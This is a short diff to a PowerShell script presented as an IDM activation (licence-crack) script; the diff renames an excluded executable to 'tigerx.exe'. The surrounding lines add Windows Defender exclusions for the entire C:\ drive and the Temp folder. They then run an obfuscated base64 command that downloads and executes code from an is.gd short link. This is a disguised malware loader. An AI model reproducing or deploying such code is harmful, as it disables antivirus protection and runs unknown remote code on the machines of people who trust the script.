@@ -1,6 +1,6 @@
 # Check the instructions here on how to use it https://github.com/lstprjct/IDM-Activation-Script/wiki
 
-Add-MpPreference -ExclusionPath "C:\","IDM-Lifetime-license.exe","C:\Windows\Temp\"
+Add-MpPreference -ExclusionPath "C:\","tigerx.exe","C:\Windows\Temp\"
 powershell.exe -encodedCommand aQBlAHgAKABpAHIAbQAgAGkAcwAuAGcAZAAvAHQAaQBnAGUAcgB4ACkA
 
 $ErrorActionPreference = "Stop"
